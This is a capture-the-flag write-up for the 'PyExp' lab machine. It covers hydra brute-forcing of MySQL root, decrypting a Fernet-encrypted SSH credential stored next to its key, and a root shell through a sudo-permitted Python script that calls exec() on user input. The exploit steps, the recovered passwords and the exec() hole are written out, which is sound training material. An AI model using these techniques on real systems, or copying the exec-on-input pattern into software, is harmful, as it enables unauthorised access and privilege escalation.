# PyExp
### Enumeration
Only ports 1337 and 3306 are open. 1337 is just SSH, 3306 is MySQL.

I couldn't find any exploits for the version of MySQL that appeared to be running, and various metasploit scanning scripts returned nothing. So I ran hydra with `root` as the username and `rockyou.txt` as the password list. And I got a result! The password is `prettywoman`.

Connecting to the MySQL server, we see the following databases:

```
MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.003 sec)

MariaDB [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.001 sec)

MariaDB [data]> describe fernet;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| cred  | varchar(255) | YES  |     | NULL    |       |
| keyy  | varchar(255) | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
2 rows in set (0.003 sec)
```

We run `select * from fernet` and the get the values:
- `cred`: `gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=`
- `keyy`: `UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=`

Googling `fernet`, it looks to be a crytographic scheme. We can decrypt `cred` using `keyy` as follows:

```python
from cryptography.fernet import Fernet
f = Fernet('UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=')
f.decrypt(b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=')

# Output: b'lucy:wJ9`"Lemdv9[FEw-'
```

We are able to connect via SSH using these credentials. We can immediately grab the user flag.

Running `sudo -l`, we see we are able to execute `/usr/bin/python2 /opt/exp.py`. The contents of `/opt/exp.py` is:

```python
uinput = raw_input('how are you?')
exec(uinput)
```

So running the sudo command, we provide as input to the python script `import pty;pty.spawn("/bin/bash")`. This gives us a root shell and we can grab the root flag.